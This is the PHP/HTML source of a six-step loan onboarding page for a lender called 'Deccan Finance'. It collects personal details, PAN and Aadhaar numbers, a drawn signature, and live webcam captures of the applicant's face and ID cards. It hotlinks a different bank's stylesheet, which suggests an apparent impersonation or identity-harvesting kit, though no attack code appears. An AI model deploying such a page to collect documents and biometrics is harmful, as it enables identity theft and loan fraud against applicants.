<?php
/**
 * Deccan Finance Limited Onboarding - Open Account Form Page
 * Displays the multi-step full-page onboarding flow
 */

require_once 'api/db_helper.php';

$ip = get_client_ip();
if (is_rate_limited($ip, 3, 10)) {
    // If rate limited, redirect back to choose page which displays the blocker
    header('Location: choose-account.php');
    exit;
}

$type = isset($_GET['type']) ? strtoupper($_GET['type']) : 'VEHICLE';
if ($type !== 'VEHICLE' && $type !== 'HOME') {
    $type = 'VEHICLE';
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Deccan Finance - <?= htmlspecialchars($type) ?> Loan</title>
    
    <!-- CSS Toolkits -->
    <link rel="stylesheet" href="https://assets.rmb.co.za/css/firstrand.toolkit.min.css" type="text/css">
    <link rel="stylesheet" href="https://assets.rmb.co.za/fonts/fonts.css" type="text/css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/ionicons/2.0.1/css/ionicons.min.css" type="text/css">
    <link rel="icon" type="image/png" href="favicon.png">
    
    <style>
        body {
            background-color: #f4f6f9;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            margin: 0;
            padding: 0;
        }
        .header.inverted {
            background-color: #031f73;
            border-bottom: 4px solid #fecb00;
        }
        .header.inverted .logo {
            filter: none;
            height: 35px;
        }
        .onboard-container {
            max-width: 950px;
            margin: 40px auto;
            padding: 0 20px;
            box-sizing: border-box;
        }
        .onboard-card {
            background: white;
            border-radius: 6px;
            box-shadow: 0 4px 25px rgba(0,0,0,0.06);
            display: flex;
            flex-direction: column;
            overflow: hidden;
        }
        .onboard-card-header {
            background-color: #031f73;
            color: white;
            padding: 20px 30px;
            border-bottom: 4px solid #fecb00;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .onboard-card-header h2 {
            margin: 0;
            color: white;
            font-size: 1.3rem;
            font-weight: 700;
        }
        .account-badge {
            background-color: #fecb00;
            color: #031f73;
            padding: 4px 12px;
            border-radius: 4px;
            font-size: 0.8rem;
            font-weight: 700;
            text-transform: uppercase;
        }
        .onboard-body {
            padding: 35px;
        }
        
        /* Steps Indicators bar */
        .step-progress-bar {
            display: flex;
            justify-content: space-between;
            margin-bottom: 40px;
            position: relative;
            padding: 0;
            list-style: none;
        }
        .step-progress-bar::before {
            content: "";
            position: absolute;
            top: 15px;
            left: 0;
            width: 100%;
            height: 3px;
            background-color: #e1e8ed;
            z-index: 1;
        }
        .step-item {
            position: relative;
            z-index: 2;
            text-align: center;
            flex-grow: 1;
        }
        .step-dot {
            width: 32px;
            height: 32px;
            border-radius: 50%;
            background-color: #e1e8ed;
            border: 3px solid #f4f6f9;
            color: #777;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 10px;
            font-size: 0.9rem;
            font-weight: 700;
            transition: all 0.3s;
        }
        .step-item.active .step-dot {
            background-color: #031f73;
            color: white;
            border-color: #fecb00;
        }
        .step-item.completed .step-dot {
            background-color: #27c93f;
            color: white;
            border-color: #27c93f;
        }
        .step-label {
            font-size: 0.75rem;
            font-weight: 700;
            color: #888;
            text-transform: uppercase;
            letter-spacing: 0.05em;
        }
        .step-item.active .step-label {
            color: #031f73;
        }
        .step-item.completed .step-label {
            color: #27c93f;
        }
        
        /* Step Sections visibility */
        .step-section {
            display: none;
        }
        .step-section.active {
            display: block;
        }
        
        /* Grid Form Controls */
        .form-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
        }
        @media (max-width: 768px) {
            .form-grid {
                grid-template-columns: 1fr;
            }
        }
        .form-full-width {
            grid-column: span 2;
        }
        @media (max-width: 768px) {
            .form-full-width {
                grid-column: span 1;
            }
        }
        .form-control-custom {
            display: flex;
            flex-direction: column;
            margin-bottom: 15px;
        }
        .form-control-custom label {
            font-weight: 700;
            font-size: 0.8rem;
            color: #031f73;
            text-transform: uppercase;
            letter-spacing: 0.05em;
            margin-bottom: 6px;
        }
        .form-control-custom input,
        .form-control-custom select,
        .form-control-custom textarea {
            padding: 12px 15px;
            border: 1px solid #ccd6dd;
            border-radius: 4px;
            background-color: #f5f8fa;
            font-size: 0.95rem;
            transition: all 0.3s;
        }
        .form-control-custom input:focus,
        .form-control-custom select:focus,
        .form-control-custom textarea:focus {
            border-color: #fecb00;
            background-color: white;
            outline: none;
        }
        .form-control-custom textarea {
            height: 90px;
            resize: vertical;
        }
        
        /* Signature Canvas Board */
        .signature-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            margin: 20px 0;
        }
        .signature-pad-wrapper {
            border: 2px dashed #ccd6dd;
            border-radius: 6px;
            background-color: #fafbfc;
            width: 100%;
            max-width: 500px;
            position: relative;
        }
        .signature-canvas {
            display: block;
            width: 100%;
            height: 220px;
            cursor: crosshair;
        }
        .signature-actions {
            display: flex;
            gap: 10px;
            margin-top: 12px;
        }
        .btn-sig-clear {
            background-color: #ff5f56;
            color: white;
            border: none;
            padding: 8px 18px;
            border-radius: 4px;
            font-weight: 600;
            cursor: pointer;
            font-size: 0.85rem;
        }
        
        /* Live Camera portrait styling */
        .camera-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            margin: 20px 0;
        }
        .camera-feed-box {
            width: 320px;
            height: 320px;
            border-radius: 50%;
            border: 4px solid #031f73;
            overflow: hidden;
            background-color: #020612;
            position: relative;
            display: flex;
            justify-content: center;
            align-items: center;
            box-shadow: 0 4px 15px rgba(0,0,0,0.15);
        }
        .camera-video {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
        .captured-image-preview {
            width: 100%;
            height: 100%;
            object-fit: cover;
            display: none;
        }
        .btn-capture {
            background-color: #fecb00;
            color: #031f73;
            border: none;
            padding: 10px 24px;
            border-radius: 4px;
            font-weight: 700;
            margin-top: 20px;
            cursor: pointer;
            text-transform: uppercase;
            font-size: 0.85rem;
            letter-spacing: 0.05em;
        }
        .btn-capture:hover {
            background-color: #031f73;
            color: white;
        }
        
        /* KYC Document upload webcam capture boards */
        .kyc-docs-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 30px;
            margin-top: 20px;
        }
        @media (max-width: 768px) {
            .kyc-docs-grid {
                grid-template-columns: 1fr;
            }
        }
        .doc-capture-card {
            border: 1px solid #e1e8ed;
            border-radius: 6px;
            padding: 20px;
            text-align: center;
            background-color: #fafbfc;
        }
        .doc-capture-card h4 {
            color: #031f73;
            margin-top: 0;
            margin-bottom: 15px;
            font-size: 1rem;
        }
        .doc-video-box {
            width: 100%;
            height: 180px;
            background-color: #020612;
            border-radius: 4px;
            overflow: hidden;
            position: relative;
            border: 2px solid #ccd6dd;
        }
        .doc-video {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
        .doc-preview {
            width: 100%;
            height: 100%;
            object-fit: cover;
            display: none;
        }
        
        /* Navigation footer */
        .onboard-footer {
            border-top: 1px solid #e1e8ed;
            padding: 20px 35px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            background-color: #f8fafc;
        }
        .btn-onboard-nav {
            padding: 10px 24px;
            border-radius: 4px;
            font-weight: 700;
            cursor: pointer;
            font-size: 0.9rem;
            text-transform: uppercase;
            transition: all 0.3s;
        }
        .btn-onboard-primary {
            background-color: #fecb00;
            color: #031f73;
            border: none;
        }
        .btn-onboard-primary:hover {
            background-color: #031f73;
            color: white;
        }
        .btn-onboard-secondary {
            background-color: transparent;
            border: 1px solid #ccd6dd;
            color: #666;
        }
        .btn-onboard-secondary:hover {
            background-color: #e1e8ed;
            color: #333;
        }
        
        /* Preview lists */
        .review-section {
            border-bottom: 1px dashed #e1e8ed;
            padding-bottom: 20px;
            margin-bottom: 20px;
        }
        .review-section:last-child {
            border-bottom: none;
            padding-bottom: 0;
            margin-bottom: 0;
        }
        .review-section h4 {
            color: #031f73;
            margin-top: 0;
            margin-bottom: 12px;
            font-size: 0.95rem;
            text-transform: uppercase;
        }
        .review-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 10px 20px;
            font-size: 0.9rem;
        }
        @media (max-width: 768px) {
            .review-grid {
                grid-template-columns: 1fr;
            }
        }
        .review-row {
            display: flex;
        }
        .review-label {
            font-weight: 700;
            color: #666;
            width: 40%;
        }
        .review-val {
            width: 60%;
        }
        .review-assets {
            display: flex;
            gap: 20px;
            margin-top: 15px;
        }
        .review-asset-box {
            text-align: center;
            font-size: 0.8rem;
            color: #666;
        }
        .review-asset-box img {
            border: 1px solid #ccd6dd;
            border-radius: 4px;
            background-color: #f8fafc;
            display: block;
            margin-bottom: 5px;
        }
        
        /* Success Screen */
        .success-card {
            text-align: center;
            padding: 50px 30px;
        }
        .success-icon {
            font-size: 5rem;
            color: #27c93f;
            margin-bottom: 25px;
            display: block;
        }
        .app-id-badge-large {
            display: inline-block;
            background-color: rgba(3, 31, 115, 0.05);
            border: 2px dashed #031f73;
            color: #031f73;
            font-size: 1.8rem;
            font-weight: 700;
            padding: 15px 40px;
            border-radius: 4px;
            margin: 25px 0;
            letter-spacing: 2px;
        }
    </style>
</head>
<body class="has-header loaded">

    <!-- Header -->
    <header class="header inverted">
        <div class="container" style="padding-top:10px; padding-bottom:10px;">
            <a href="index.html">
                <img src="logo.png" alt="Deccan Finance Logo" class="logo">
            </a>
        </div>
    </header>

    <div class="onboard-container">
        <div class="onboard-card">
            
            <div class="onboard-card-header">
                <h2>Loan Application</h2>
                <div class="account-badge" id="account-type-badge"><?= htmlspecialchars($type) ?> LOAN</div>
            </div>

            <!-- Steps Progress Bar -->
            <div class="onboard-body" style="padding-bottom: 0;">
                <ul class="step-progress-bar">
                    <li class="step-item active" id="dot-step-1">
                        <div class="step-dot">1</div>
                        <div class="step-label">Basic</div>
                    </li>
                    <li class="step-item" id="dot-step-2">
                        <div class="step-dot">2</div>
                        <div class="step-label">KYC Info</div>
                    </li>
                    <li class="step-item" id="dot-step-3">
                        <div class="step-dot">3</div>
                        <div class="step-label">Signature</div>
                    </li>
                    <li class="step-item" id="dot-step-4">
                        <div class="step-dot">4</div>
                        <div class="step-label">Live Photo</div>
                    </li>
                    <li class="step-item" id="dot-step-5">
                        <div class="step-dot">5</div>
                        <div class="step-label">Documents</div>
                    </li>
                    <li class="step-item" id="dot-step-6">
                        <div class="step-dot">6</div>
                        <div class="step-label">Review</div>
                    </li>
                </ul>
            </div>

            <div class="onboard-body">
                <div class="alert alert-danger" id="submit-error-alert" style="display: none; padding: 12px; margin-bottom: 25px; border-radius: 4px; background: #ffebeb; border: 1px solid #ffccd0; color: #d8000c; font-size: 0.9rem;"></div>
                
                <form id="onboarding-main-form" autocomplete="off">
                    <input type="hidden" name="account_type" id="account_type_field" value="<?= htmlspecialchars($type) ?>">
                    
                    <!-- STEP 1: Basic Details -->
                    <div class="step-section active" id="sec-step-1">
                        <h3 style="color: #031f73; margin-top: 0; margin-bottom: 25px; border-bottom: 1px solid #f4f6f9; padding-bottom: 10px;">Step 1: Personal / Contact Details</h3>
                        <div class="form-grid">
                            <div class="form-control-custom">
                                <label for="full_name">Full Name (As per PAN/ID)</label>
                                <input type="text" id="full_name" name="full_name" required>
                            </div>
                            <div class="form-control-custom">
                                <label for="email">Email Address</label>
                                <input type="email" id="email" name="email" required>
                            </div>
                            <div class="form-control-custom">
                                <label for="phone">Phone Number</label>
                                <input type="tel" id="phone" name="phone" placeholder="+91 XXXXX XXXXX" required>
                            </div>
                            
                            <?php if ($type === 'VEHICLE'): ?>
                                <div class="form-control-custom">
                                    <label for="dob">Date of Birth</label>
                                    <input type="date" id="dob" name="dob" required>
                                </div>
                                <div class="form-control-custom">
                                    <label for="gender">Gender</label>
                                    <select id="gender" name="gender" required>
                                        <option value="">Select Gender</option>
                                        <option value="Male">Male</option>
                                        <option value="Female">Female</option>
                                        <option value="Other">Other</option>
                                    </select>
                                </div>
                            <?php endif; ?>

                            <div class="form-control-custom form-full-width">
                                <label for="address">Mailing Address</label>
                                <textarea id="address" name="address" placeholder="Residential or corporate office address" required></textarea>
                            </div>
                        </div>
                    </div>

                    <!-- STEP 2: KYC Details -->
                    <div class="step-section" id="sec-step-2">
                        <h3 style="color: #031f73; margin-top: 0; margin-bottom: 25px; border-bottom: 1px solid #f4f6f9; padding-bottom: 10px;">Step 2: Verification (KYC) Info</h3>
                        <div class="form-grid">
                            <div class="form-control-custom">
                                <label for="national_id">PAN Card Number / National ID</label>
                                <input type="text" id="national_id" name="national_id" placeholder="e.g. ABCDE1234F" required>
                            </div>

                            <?php if ($type === 'VEHICLE'): ?>
                                <div class="form-control-custom">
                                    <label for="initial_deposit">Requested Loan Amount (INR)</label>
                                    <input type="number" id="initial_deposit" name="initial_deposit" min="10000" placeholder="Minimum 10,000 INR" required>
                                </div>
                            <?php else: ?>
                                <div class="form-control-custom">
                                    <label for="business_name">Business Legal Name</label>
                                    <input type="text" id="business_name" name="business_name" required>
                                </div>
                                <div class="form-control-custom">
                                    <label for="business_reg_no">GSTIN / Business Registration No.</label>
                                    <input type="text" id="business_reg_no" name="business_reg_no" required>
                                </div>
                                <div class="form-control-custom form-full-width">
                                    <label for="expected_turnover">Expected Monthly Turnover (INR)</label>
                                    <input type="number" id="expected_turnover" name="expected_turnover" min="0" placeholder="Estimated transactions in INR" required>
                                </div>
                            <?php endif; ?>
                        </div>
                    </div>

                    <!-- STEP 3: Signature Board -->
                    <div class="step-section" id="sec-step-3">
                        <h3 style="color: #031f73; margin-top: 0; margin-bottom: 25px; border-bottom: 1px solid #f4f6f9; padding-bottom: 10px;">Step 3: Signature Drawing Board</h3>
                        <p style="font-size: 0.9rem; color:#666;">Please sign your name on the board below using your mouse cursor, trackpad, or touchscreen. This will be verified against your official records.</p>
                        
                        <div class="signature-container">
                            <div class="signature-pad-wrapper">
                                <canvas id="signature-canvas" class="signature-canvas"></canvas>
                            </div>
                            <div class="signature-actions">
                                <button type="button" class="btn-sig-clear" id="btn-clear-sig">Clear Drawing</button>
                            </div>
                            <!-- Hidden input to hold base64 image data -->
                            <input type="hidden" name="signature_data" id="signature_data">
                        </div>
                    </div>

                    <!-- STEP 4: Live Photo -->
                    <div class="step-section" id="sec-step-4">
                        <h3 style="color: #031f73; margin-top: 0; margin-bottom: 25px; border-bottom: 1px solid #f4f6f9; padding-bottom: 10px;">Step 4: Take Live Portrait Photo</h3>
                        <p style="font-size: 0.9rem; color:#666; text-align: center;">Align your face inside the circle and click "Capture Photo". Direct file uploads are disabled for security verification.</p>
                        
                        <div class="camera-container">
                            <div class="camera-feed-box">
                                <video id="portrait-video" class="camera-video" autoplay playsinline></video>
                                <img id="portrait-preview" class="captured-image-preview" alt="Portrait Capture">
                            </div>
                            <button type="button" class="btn-capture" id="btn-capture-portrait">Capture Photo</button>
                            <button type="button" class="btn-sig-clear" id="btn-retake-portrait" style="display:none; margin-top:15px; background-color:#888;">Retake Photo</button>
                            <input type="hidden" name="portrait_data" id="portrait_data">
                        </div>
                    </div>

                    <!-- STEP 5: KYC Documents -->
                    <div class="step-section" id="sec-step-5">
                        <h3 style="color: #031f73; margin-top: 0; margin-bottom: 25px; border-bottom: 1px solid #f4f6f9; padding-bottom: 10px;">Step 5: Capture KYC Documents Live</h3>
                        <p style="font-size: 0.9rem; color:#666;">Align each ID document in front of your camera and click capture. No gallery uploads allowed.</p>
                        
                        <div class="kyc-docs-grid">
                            <!-- Document 1: PAN / Reg ID -->
                            <div class="doc-capture-card">
                                <h4>1. PAN Card / Business ID (Front)</h4>
                                <div class="doc-video-box">
                                    <video id="pan-video" class="doc-video" autoplay playsinline></video>
                                    <img id="pan-preview" class="doc-preview" alt="PAN Card Capture">
                                </div>
                                <button type="button" class="btn-capture" id="btn-capture-pan" style="padding: 8px 16px; margin-top:15px;">Capture PAN</button>
                                <button type="button" class="btn-sig-clear" id="btn-retake-pan" style="display:none; margin-top:15px; background-color:#888; padding: 8px 16px;">Retake</button>
                                <input type="hidden" name="doc_pan_data" id="doc_pan_data">
                            </div>
                            
                            <!-- Document 2: Aadhaar / Address ID -->
                            <div class="doc-capture-card">
                                <h4>2. Aadhaar Card / Address Proof (Front)</h4>
                                <div class="doc-video-box">
                                    <video id="aadhaar-video" class="doc-video" autoplay playsinline></video>
                                    <img id="aadhaar-preview" class="doc-preview" alt="Aadhaar Card Capture">
                                </div>
                                <button type="button" class="btn-capture" id="btn-capture-aadhaar" style="padding: 8px 16px; margin-top:15px;">Capture Aadhaar</button>
                                <button type="button" class="btn-sig-clear" id="btn-retake-aadhaar" style="display:none; margin-top:15px; background-color:#888; padding: 8px 16px;">Retake</button>
                                <input type="hidden" name="doc_aadhaar_data" id="doc_aadhaar_data">
                            </div>
                        </div>
                    </div>

                    <!-- STEP 6: Review & Submit -->
                    <div class="step-section" id="sec-step-6">
                        <h3 style="color: #031f73; margin-top: 0; margin-bottom: 25px; border-bottom: 1px solid #f4f6f9; padding-bottom: 10px;">Step 6: Review Your Application</h3>
                        <p style="font-size: 0.9rem; color:#666; margin-bottom: 30px;">Verify your details below. Once submitted, your application will be locked and sent in-review.</p>
                        
                        <div class="review-section">
                            <h4>Personal & Contact Details</h4>
                            <div class="review-grid">
                                <div class="review-row">
                                    <div class="review-label">Full Name</div>
                                    <div class="review-val" id="rev-full-name">--</div>
                                </div>
                                <div class="review-row">
                                    <div class="review-label">Email</div>
                                    <div class="review-val" id="rev-email">--</div>
                                </div>
                                <div class="review-row">
                                    <div class="review-label">Phone</div>
                                    <div class="review-val" id="rev-phone">--</div>
                                </div>
                                <div class="review-row">
                                    <div class="review-label">Address</div>
                                    <div class="review-val" id="rev-address">--</div>
                                </div>
                                <?php if ($type === 'VEHICLE'): ?>
                                    <div class="review-row">
                                        <div class="review-label">Date of Birth</div>
                                        <div class="review-val" id="rev-dob">--</div>
                                    </div>
                                    <div class="review-row">
                                        <div class="review-label">Gender</div>
                                        <div class="review-val" id="rev-gender">--</div>
                                    </div>
                                <?php endif; ?>
                            </div>
                        </div>

                        <div class="review-section">
                            <h4>Verification & Financials</h4>
                            <div class="review-grid">
                                <div class="review-row">
                                    <div class="review-label">PAN/National ID</div>
                                    <div class="review-val" id="rev-national-id">--</div>
                                </div>
                                <?php if ($type === 'VEHICLE'): ?>
                                    <div class="review-row">
                                        <div class="review-label">Loan Amount</div>
                                        <div class="review-val" id="rev-initial-deposit">--</div>
                                    </div>
                                <?php else: ?>
                                    <div class="review-row">
                                        <div class="review-label">Business Name</div>
                                        <div class="review-val" id="rev-business-name">--</div>
                                    </div>
                                    <div class="review-row">
                                        <div class="review-label">GST / Reg No</div>
                                        <div class="review-val" id="rev-business-reg">--</div>
                                    </div>
                                    <div class="review-row">
                                        <div class="review-label">Monthly Volume</div>
                                        <div class="review-val" id="rev-turnover">--</div>
                                    </div>
                                <?php endif; ?>
                            </div>
                        </div>

                        <div class="review-section">
                            <h4>Biometrics & Signatures</h4>
                            <div class="review-assets">
                                <div class="review-asset-box">
                                    <img id="rev-img-portrait" width="120" height="120" style="object-fit: cover; border-radius: 50%;">
                                    Portrait
                                </div>
                                <div class="review-asset-box">
                                    <img id="rev-img-sig" width="150" height="90" style="object-fit: contain;">
                                    Signature
                                </div>
                                <div class="review-asset-box">
                                    <img id="rev-img-pan" width="140" height="90" style="object-fit: cover;">
                                    PAN Card
                                </div>
                                <div class="review-asset-box">
                                    <img id="rev-img-aadhaar" width="140" height="90" style="object-fit: cover;">
                                    Aadhaar Card
                                </div>
                            </div>
                        </div>
                    </div>
                </form>

                <!-- STEP 7: Success Page (Dynamic) -->
                <div class="step-section" id="sec-step-7">
                    <div class="success-card">
                        <span class="success-icon ion-ios-checkmark-outline"></span>
                        <h2 style="color: #031f73; margin-top: 0; font-weight:700;">Application Lodged Successfully</h2>
                        <p style="color:#666; font-size:1.05rem;">We have registered your request. Your digital application is currently in-review.</p>
                        
                        <div class="app-id-badge-large" id="lbl-app-id">FR-000000</div>
                        
                        <p style="color: #555; font-size: 0.95rem; max-width: 500px; margin: 0 auto 30px; line-height: 1.6;">
                            Our onboarding verification team will inspect your live documents, photo capture, and signature. An approval confirmation will be dispatched via email shortly.
                        </p>
                        <a href="index.html" class="btn-onboard-nav btn-onboard-secondary" style="text-decoration:none;">Return to Homepage</a>
                    </div>
                </div>

            </div>

            <div class="onboard-footer" id="onboard-footer-actions">
                <button type="button" class="btn-onboard-nav btn-onboard-secondary" id="btn-nav-back" style="display: none;">Back</button>
                <div style="flex-grow: 1;"></div>
                <button type="button" class="btn-onboard-nav btn-onboard-primary" id="btn-nav-next">Next Step</button>
                <button type="button" class="btn-onboard-nav btn-onboard-primary" id="btn-nav-submit" style="display: none;">Submit Application</button>
            </div>

        </div>
    </div>

    <!-- Load Onboarding Script Logic -->
    <script src="open-account.js"></script>
</body>
</html>
